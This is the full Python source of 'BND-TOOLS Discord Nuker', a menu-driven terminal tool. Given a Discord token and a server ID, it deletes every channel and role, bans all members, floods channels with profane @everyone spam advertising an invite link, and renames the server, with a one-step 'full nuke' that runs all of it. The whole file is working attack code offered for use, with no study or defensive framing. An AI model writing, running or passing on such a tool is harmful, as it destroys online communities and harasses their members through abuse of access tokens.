import sys
if hasattr(sys.stdout, 'reconfigure'): sys.stdout.reconfigure(encoding='utf-8')
import os, time, math, asyncio, aiohttp, json, random, threading

from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.align import Align
from rich.live import Live
from rich.table import Table
from rich.layout import Layout
from rich import box

console = Console()

# ============== FARBE AUS CONFIG LADEN ==============
CONFIG_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "config.json")

def hex_to_ansi(hex_code):
    hex_code = hex_code.lstrip('#')
    r = int(hex_code[0:2], 16)
    g = int(hex_code[2:4], 16)
    b = int(hex_code[4:6], 16)
    return f"\033[38;2;{r};{g};{b}m"

def get_current_color():
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
                theme = config.get("theme", "BLUE")
                colors = {
                    "RED": "#ff0000", "GREEN": "#00ff00", "BLUE": "#0000ff",
                    "YELLOW": "#ffff00", "PURPLE": "#9b00ff", "CYAN": "#00ffff",
                    "ORANGE": "#ff6600", "PINK": "#ff69b4", "LIME": "#bfff00",
                    "WHITE": "#ffffff", "ROSE": "#ff0088", "GOLD": "#ffd700"
                }
                hex_color = colors.get(theme, "#0000ff")
                return hex_to_ansi(hex_color), hex_color, theme
    except (json.JSONDecodeError, OSError):
        pass
    return "\033[38;2;0;0;255m", "#0000ff", "BLUE"

CURRENT_COLOR, CURRENT_HEX, CURRENT_THEME = get_current_color()
RESET = "\033[0m"

# BND-TOOLS Banner
ASCII = r"""
  ██████╗ ███╗   ██╗██████╗     ████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔══██╗████╗  ██║██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██████╔╝██╔██╗ ██║██║  ██║       ██║   ██║   ██║██║   ██║██║     ███████╗
  ██╔══██╗██║╚██╗██║██║  ██║       ██║   ██║   ██║██║   ██║██║     ╚════██║
  ██████╔╝██║ ╚████║██████╔╝       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
  ╚═════╝ ╚═╝  ╚═══╝╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
"""

def boot():
    if sys.platform.startswith("win"):
        os.system("title BND-TOOLS // DISCORD NUKER")
    os.system("cls" if os.name == "nt" else "clear")
    sys.stdout.write("\033[?25l")
    lines = ASCII.strip("\n").split("\n")
    t0 = time.time()
    try:
        while time.time() - t0 < 1.4:
            t = time.time() - t0
            sys.stdout.write("\033[H\n")
            for line in lines:
                sys.stdout.write("  ")
                for c, ch in enumerate(line):
                    if ch == " ":
                        sys.stdout.write(" ")
                    else:
                        brightness = max(80, min(255, int(150 + 105 * math.sin(t * 10 - c * 0.2))))
                        if CURRENT_THEME == "RED":
                            sys.stdout.write(f"\033[38;2;{brightness};0;0m{ch}")
                        elif CURRENT_THEME == "GREEN":
                            sys.stdout.write(f"\033[38;2;0;{brightness};0m{ch}")
                        elif CURRENT_THEME == "BLUE":
                            sys.stdout.write(f"\033[38;2;0;0;{brightness}m{ch}")
                        elif CURRENT_THEME == "YELLOW":
                            sys.stdout.write(f"\033[38;2;{brightness};{brightness};0m{ch}")
                        elif CURRENT_THEME == "PURPLE":
                            sys.stdout.write(f"\033[38;2;{brightness//2};0;{brightness}m{ch}")
                        elif CURRENT_THEME == "CYAN":
                            sys.stdout.write(f"\033[38;2;0;{brightness};{brightness}m{ch}")
                        elif CURRENT_THEME == "ORANGE":
                            sys.stdout.write(f"\033[38;2;{brightness};{brightness//2};0m{ch}")
                        elif CURRENT_THEME == "PINK":
                            sys.stdout.write(f"\033[38;2;{brightness};{brightness//2};{brightness//2}m{ch}")
                        elif CURRENT_THEME == "WHITE":
                            sys.stdout.write(f"\033[38;2;{brightness};{brightness};{brightness}m{ch}")
                        else:
                            sys.stdout.write(f"\033[38;2;{brightness//2};0;{brightness}m{ch}")
                sys.stdout.write("\033[0m\n")
            sys.stdout.flush()
            time.sleep(0.025)
    finally:
        sys.stdout.write("\033[?25h\033[0m")
    os.system("cls" if os.name == "nt" else "clear")

# ============== SPAM MESSAGES ==============
SPAM_MESSAGES = [
    "@everyone **FUCKED BY BND-TOOLS**",
    "@everyone **JOIN NOW** https://discord.gg/Gc2MKCJvtm",
    "@everyone **GET REKT** https://discord.gg/Gc2MKCJvtm",
    "@everyone **BND-TOOLS ON TOP** https://discord.gg/Gc2MKCJvtm",
    "@everyone **DISCORD DESTROYED** https://discord.gg/Gc2MKCJvtm",
    "@everyone **L + RATIO** https://discord.gg/Gc2MKCJvtm",
    "@everyone **SERVER NUKED BY BND**",
    "@everyone **https://discord.gg/Gc2MKCJvtm** JOIN NOW!",
    "@everyone **FUCKED** https://discord.gg/Gc2MKCJvtm",
    "@everyone **BND-TOOLS BEST OSINT** https://discord.gg/Gc2MKCJvtm"
]

# ============== DISCORD NUKER FUNCTIONS ==============
async def delete_channels(session, guild_id, token):
    headers = {"Authorization": token, "User-Agent": "Mozilla/5.0"}
    deleted = 0
    try:
        async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers) as r:
            if r.status == 200:
                channels = await r.json()
                for channel in channels:
                    try:
                        async with session.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers=headers) as r:
                            if r.status in [200, 204]:
                                deleted += 1
                        await asyncio.sleep(0.2)
                    except Exception:
                        pass
    except Exception:
        pass
    return deleted

async def create_channels(session, guild_id, token, name, amount):
    headers = {"Authorization": token, "User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
    created = 0
    for i in range(amount):
        try:
            payload = {"name": f"{name}-{i+1}", "type": 0}
            async with session.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=payload) as r:
                if r.status == 201:
                    created += 1
            await asyncio.sleep(0.15)
        except Exception:
            pass
    return created

async def spam_channels(session, guild_id, token, message_count):
    headers = {"Authorization": token, "User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
    spammed = 0
    try:
        async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers) as r:
            if r.status == 200:
                channels = await r.json()
                for channel in channels:
                    for i in range(message_count):
                        try:
                            msg = random.choice(SPAM_MESSAGES)
                            payload = {"content": msg}
                            async with session.post(f"https://discord.com/api/v9/channels/{channel['id']}/messages", headers=headers, json=payload) as r:
                                if r.status == 200:
                                    spammed += 1
                            await asyncio.sleep(0.1)
                        except Exception:
                            pass
    except Exception:
        pass
    return spammed

async def ban_members(session, guild_id, token):
    headers = {"Authorization": token, "User-Agent": "Mozilla/5.0"}
    banned = 0
    try:
        async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", headers=headers) as r:
            if r.status == 200:
                members = await r.json()
                for member in members:
                    if member.get('user', {}).get('id'):
                        try:
                            async with session.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{member['user']['id']}", headers=headers) as r:
                                if r.status == 204:
                                    banned += 1
                            await asyncio.sleep(0.15)
                        except Exception:
                            pass
    except Exception:
        pass
    return banned

async def rename_server(session, guild_id, token, new_name):
    headers = {"Authorization": token, "User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
    try:
        payload = {"name": new_name}
        async with session.patch(f"https://discord.com/api/v9/guilds/{guild_id}", headers=headers, json=payload) as r:
            return r.status == 200
    except Exception:
        return False

async def delete_roles(session, guild_id, token):
    headers = {"Authorization": token, "User-Agent": "Mozilla/5.0"}
    deleted = 0
    try:
        async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers) as r:
            if r.status == 200:
                roles = await r.json()
                for role in roles:
                    if role.get('name') != '@everyone':
                        try:
                            async with session.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role['id']}", headers=headers) as r:
                                if r.status in [200, 204]:
                                    deleted += 1
                            await asyncio.sleep(0.2)
                        except Exception:
                            pass
    except Exception:
        pass
    return deleted

# ============== MAIN MENU ==============
def main_menu():
    console.print(Align.center(Panel(Text.from_markup(f"[bold {CURRENT_HEX}]BND-TOOLS[/] [dim]||[/] [white]DISCORD NUKER[/]"), border_style=CURRENT_HEX, padding=(0, 5))))
    console.print()
    
    menu_text = f"""
[bold {CURRENT_HEX}]┌────────────────────────────────────────────┐
│  [white]01[/] [white]▶[/] Delete All Channels                  │
│  [white]02[/] [white]▶[/] Create Channels                      │
│  [white]03[/] [white]▶[/] Spam @everyone in All Channels       │
│  [white]04[/] [white]▶[/] Mass Ban Members                     │
│  [white]05[/] [white]▶[/] Delete All Roles                     │
│  [white]06[/] [white]▶[/] Rename Server                        │
│  [white]07[/] [white]▶[/] FULL NUKE (All-in-One)               │
│  [white]99[/] [white]▶[/] Exit                                 │
└────────────────────────────────────────────┘
"""
    
    menu = Panel(Text.from_markup(menu_text), border_style=CURRENT_HEX, padding=(0, 2))
    console.print(Align.center(menu))
    console.print()
    return console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]Select option >> ").strip()

# ============== DELETE CHANNELS ==============
def delete_channels_ui():
    console.print(Align.center(Panel(Text.from_markup(f"[bold {CURRENT_HEX}]DELETE ALL CHANNELS[/]"), border_style=CURRENT_HEX)))
    token = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]Discord Token >> ").strip()
    if not token: return
    guild = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]Server/Guild ID >> ").strip()
    if not guild: return
    
    console.print(f"\n [dim]Deleting all channels...[/]")
    async def run():
        async with aiohttp.ClientSession() as session:
            deleted = await delete_channels(session, guild, token)
            console.print(f" [bold red]✗ Deleted {deleted} channels[/]")
    asyncio.run(run())
    console.input(f"\n [dim]Press [bold {CURRENT_HEX}]ENTER[/] to continue...[/]")

# ============== CREATE CHANNELS ==============
def create_channels_ui():
    console.print(Align.center(Panel(Text.from_markup(f"[bold {CURRENT_HEX}]CREATE CHANNELS[/]"), border_style=CURRENT_HEX)))
    token = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]Discord Token >> ").strip()
    if not token: return
    guild = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]Server/Guild ID >> ").strip()
    if not guild: return
    name = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]Channel name >> ").strip() or "bnd-nuked"
    try:
        amount = int(console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]How many >> ").strip() or "20")
    except (ValueError, EOFError):
        amount = 20
    
    async def run():
        async with aiohttp.ClientSession() as session:
            created = await create_channels(session, guild, token, name, amount)
            console.print(f" [bold green]✓ Created {created} channels[/]")
    asyncio.run(run())
    console.input(f"\n [dim]Press [bold {CURRENT_HEX}]ENTER[/] to continue...[/]")

# ============== SPAM CHANNELS ==============
def spam_channels_ui():
    console.print(Align.center(Panel(Text.from_markup(f"[bold red]SPAM @everyone IN ALL CHANNELS[/]"), border_style="red")))
    token = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]Discord Token >> ").strip()
    if not token: return
    guild = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]Server/Guild ID >> ").strip()
    if not guild: return
    try:
        count = int(console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]Messages per channel >> ").strip() or "5")
    except (ValueError, EOFError):
        count = 5
    
    console.print(f"\n [dim]Spamming @everyone messages...[/]")
    async def run():
        async with aiohttp.ClientSession() as session:
            spammed = await spam_channels(session, guild, token, count)
            console.print(f" [bold green]✓ Spammed {spammed} messages[/]")
    asyncio.run(run())
    console.input(f"\n [dim]Press [bold {CURRENT_HEX}]ENTER[/] to continue...[/]")

# ============== MASS BAN ==============
def mass_ban_ui():
    console.print(Align.center(Panel(Text.from_markup(f"[bold {CURRENT_HEX}]MASS BAN[/]"), border_style=CURRENT_HEX)))
    token = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]Discord Token >> ").strip()
    if not token: return
    guild = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]Server/Guild ID >> ").strip()
    if not guild: return
    
    async def run():
        async with aiohttp.ClientSession() as session:
            banned = await ban_members(session, guild, token)
            console.print(f" [bold red]✗ Banned {banned} members[/]")
    asyncio.run(run())
    console.input(f"\n [dim]Press [bold {CURRENT_HEX}]ENTER[/] to continue...[/]")

# ============== DELETE ROLES ==============
def delete_roles_ui():
    console.print(Align.center(Panel(Text.from_markup(f"[bold {CURRENT_HEX}]DELETE ALL ROLES[/]"), border_style=CURRENT_HEX)))
    token = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]Discord Token >> ").strip()
    if not token: return
    guild = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]Server/Guild ID >> ").strip()
    if not guild: return
    
    async def run():
        async with aiohttp.ClientSession() as session:
            deleted = await delete_roles(session, guild, token)
            console.print(f" [bold red]✗ Deleted {deleted} roles[/]")
    asyncio.run(run())
    console.input(f"\n [dim]Press [bold {CURRENT_HEX}]ENTER[/] to continue...[/]")

# ============== RENAME SERVER ==============
def rename_server_ui():
    console.print(Align.center(Panel(Text.from_markup(f"[bold {CURRENT_HEX}]RENAME SERVER[/]"), border_style=CURRENT_HEX)))
    token = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]Discord Token >> ").strip()
    if not token: return
    guild = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]Server/Guild ID >> ").strip()
    if not guild: return
    new_name = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]New server name >> ").strip() or "FUCKED BY BND-TOOLS"
    
    async def run():
        async with aiohttp.ClientSession() as session:
            renamed = await rename_server(session, guild, token, new_name)
            console.print(f" [bold green]✓ Server renamed: {renamed}[/]")
    asyncio.run(run())
    console.input(f"\n [dim]Press [bold {CURRENT_HEX}]ENTER[/] to continue...[/]")

# ============== FULL NUKE ==============
def full_nuke():
    console.print(Align.center(Panel(Text.from_markup(f"[bold red]💀 FULL NUKE - ALL IN ONE 💀[/]"), border_style="red")))
    token = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]Discord Token >> ").strip()
    if not token: return
    guild = console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]Server/Guild ID >> ").strip()
    if not guild: return
    try:
        channel_count = int(console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]Channels to create >> ").strip() or "30")
    except (ValueError, EOFError):
        channel_count = 30
    try:
        spam_count = int(console.input(f" [bold {CURRENT_HEX}]└─▶[/] [white]Spam messages per channel >> ").strip() or "10")
    except (ValueError, EOFError):
        spam_count = 10
    
    console.print(f"\n [bold red]!!! FULL NUKE INITIATED !!![/]")
    
    async def run():
        async with aiohttp.ClientSession() as session:
            console.print(" [dim]Deleting all channels...[/]")
            deleted = await delete_channels(session, guild, token)
            console.print(f" [bold red]Deleted {deleted} channels[/]")
            await asyncio.sleep(0.5)
            
            console.print(f" [dim]Creating {channel_count} channels...[/]")
            created = await create_channels(session, guild, token, "BND-NUKED", channel_count)
            console.print(f" [bold green]Created {created} channels[/]")
            await asyncio.sleep(0.5)
            
            console.print(f" [dim]Spamming {spam_count} messages per channel...[/]")
            spammed = await spam_channels(session, guild, token, spam_count)
            console.print(f" [bold green]Spammed {spammed} messages[/]")
            await asyncio.sleep(0.5)
            
            console.print(" [dim]Banning all members...[/]")
            banned = await ban_members(session, guild, token)
            console.print(f" [bold red]Banned {banned} members[/]")
            await asyncio.sleep(0.5)
            
            console.print(" [dim]Deleting all roles...[/]")
            roles_deleted = await delete_roles(session, guild, token)
            console.print(f" [bold red]Deleted {roles_deleted} roles[/]")
            await asyncio.sleep(0.5)
            
            renamed = await rename_server(session, guild, token, "FUCKED BY BND-TOOLS | discord.gg/Gc2MKCJvtm")
            console.print(f" [bold green]Server renamed: {renamed}[/]")
            
            console.print("\n [bold green]FULL NUKE COMPLETED![/]")
            console.print(f" [bold yellow]JOIN: https://discord.gg/Gc2MKCJvtm[/]")
    
    asyncio.run(run())
    console.input(f"\n [dim]Press [bold {CURRENT_HEX}]ENTER[/] to continue...[/]")

# ============== MAIN ==============
def main():
    boot()
    while True:
        try:
            choice = main_menu()
            if choice == "1":
                delete_channels_ui()
            elif choice == "2":
                create_channels_ui()
            elif choice == "3":
                spam_channels_ui()
            elif choice == "4":
                mass_ban_ui()
            elif choice == "5":
                delete_roles_ui()
            elif choice == "6":
                rename_server_ui()
            elif choice == "7":
                full_nuke()
            elif choice == "99":
                console.print("\n [bold red]Exiting...[/]")
                break
            else:
                console.print("\n [bold red]Invalid option![/]")
                time.sleep(1)
            os.system("cls" if os.name == "nt" else "clear")
        except KeyboardInterrupt:
            console.print("\n [bold red]Exiting...[/]")
            break

if __name__ == "__main__":
    main()